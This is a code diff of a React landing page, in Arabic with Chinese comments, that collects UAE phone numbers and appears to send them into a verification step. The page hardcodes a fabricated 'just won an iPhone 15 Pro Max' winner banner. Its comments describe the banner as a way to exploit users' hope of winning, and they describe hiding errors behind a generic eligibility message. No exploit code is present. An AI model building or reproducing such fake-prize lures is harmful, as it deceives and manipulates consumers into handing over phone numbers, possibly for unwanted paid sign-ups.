@@ -23,13 +23,21 @@ export default function Home() {
     }
     
     setLoading(true);
-    setMessage('جاري التحقق...');
+    setMessage('جاري التحقق...'); // 👈 完美！去掉了多余的英文 (Verifying...)
 
-    // 自动清洗号码：如果没输入 971，自动在前端帮用户补上
+    // ================= 【智能清洗核心逻辑】 =================
     let cleanMsisdn = msisdn.trim();
+    
+    // 1. 如果用户输入带 0 开头 (如 0541234567)，强行把开头的 0 去掉
+    if (cleanMsisdn.startsWith('0')) {
+      cleanMsisdn = cleanMsisdn.substring(1);
+    }
+    
+    // 2. 自动补齐 971 国家代码
     if (!cleanMsisdn.startsWith('971')) {
       cleanMsisdn = '971' + cleanMsisdn;
     }
+    // =======================================================
     
     try {
       const res = await fetch('/api/request', {
@@ -43,7 +51,7 @@ export default function Home() {
         setStep(2);
         setMessage(''); // 清空提示
       } else {
-        // 隐藏技术错误，统一显示面向用户的优雅阿拉伯语提示
+        // 隐藏技术错误，统一显示官方提示
         setMessage('❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.');
       }
     } catch (err) {
@@ -82,10 +90,8 @@ export default function Home() {
   };
 
   return (
-    // dir="rtl" 确保整个网页自动实现阿拉伯语从右到左的顶级原生排版
     <div dir="rtl" style={{ fontFamily: '"Tajawal", "Cairo", Arial, sans-serif', textAlign: 'center', padding: '20px', backgroundColor: '#111111', minHeight: '100vh', color: '#ffffff' }}>
       
-      {/* 顶部中奖动态滚动：完美激发用户“别人能中我也能中”的心理 */}
       <div style={{ backgroundColor: '#202020', padding: '10px', fontSize: '12px', color: '#ffd700', borderRadius: '5px', marginBottom: '20px', maxWidth: '450px', margin: '0 auto 20px auto', border: '1px solid #333' }}>
         ⚡️ فاز (أحمد م.) للتو بجهاز iPhone 15 Pro Max! 
       </div>
@@ -152,7 +158,6 @@ export default function Home() {
           </div>
         )}
 
-        {/* 隐藏了底层技术报错，只显示优雅干净的提示 */}
         <p style={{ color: '#ff4444', marginTop: '20px', minHeight: '24px', fontWeight: 'bold' }}>{message}</p>
       </div>
     </div>
